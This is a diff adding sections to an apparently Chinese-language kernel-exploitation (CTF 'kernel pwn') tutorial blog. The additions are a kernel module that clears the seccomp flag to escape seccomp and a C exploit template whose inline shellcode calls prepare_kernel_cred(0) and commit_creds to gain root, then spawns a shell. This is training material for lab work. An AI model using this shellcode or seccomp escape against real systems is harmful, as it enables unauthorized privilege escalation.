@@ -28,6 +28,7 @@ comments: true
 - [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
   - [特典一：qemu monitor模式](#特典一qemu-monitor模式)
   - [特典二: kernel pwn远程传文件脚本](#特典二-kernel-pwn远程传文件脚本)
+  - [特点三： kernel pwn模板](#特点三-kernel-pwn模板)
 
 
 # 1. kernel 环境搭建<br>
@@ -287,7 +288,37 @@ __attribute__((naked,noinline)) void privilege_escalation_kernel_shellcode(){
 ```
 ### 5.4.2 seccomp逃逸<br>
 用#5.3节提到的方法，我们需要自己编译一个内核模块:<br>
+内核模块代码:<br>
+```c
+// simple.c
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/cred.h>
+MODULE_LICENSE("GPL");
+void * test_get_thread_info_flags_addr(void){
+    return &current->thread_info.flags;
+}
+unsigned long test_get_seccomp_flag(void){
+    return TIF_SECCOMP;
+}
 
+void * test_seccomp_escape(void){
+    clear_thread_flag(TIF_SECCOMP);
+}
+```
+makefile文件:<br>
+```makefile
+obj-m += simple.o
+KDIR ?= /home/wsxk/Desktop/pwnkernel/linux-5.4 #你的linux源码目录
+PWD  := $(shell pwd)
+
+all:
+	$(MAKE) -C $(KDIR) M=$(PWD) modules
+clean:
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
+```
+直接执行`make`命令后，可以看到内核代码:<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250923223119.png)
 
 
 # 特典: kernel pwn tricks:<br>
@@ -367,6 +398,39 @@ while True:
 p.interactive()
 ```
 
+## 特点三： kernel pwn模板<br>
+```c
+// gcc -fcf-protection=none -masm=intel -static xxx.c -o xxx
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>  // define open, O_RDONLY, O_WRONLY, O_CREAT 
+#include <unistd.h> // read, write
+#include <sys/ioctl.h> // ioctl
+
+__attribute__((naked, noinline)) void privilege_escalation_kernel_shellcode(){
+    __asm__ (
+        "mov rbx, 0xffffffff810895e0;" //prepare_kernel_cred_addr
+        "mov rdi, 0;"
+        "call rbx;"     //prepare_kernel_cred(0)
+        "mov rdi, rax;" 
+        "mov rbx, 0xffffffff810892c0;" //commit_creds_addr
+        "call rbx;"
+        "nop;"
+        "ret;"
+    );
+}
+
+void get_root(){
+    if(getuid()!=0){
+        printf("failed to get root!\n");
+        exit(0);
+    }
+    printf("get root success! execve shell....\n");
+    system("/bin/sh");
+    exit(0); //exit normally
+}
+```
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
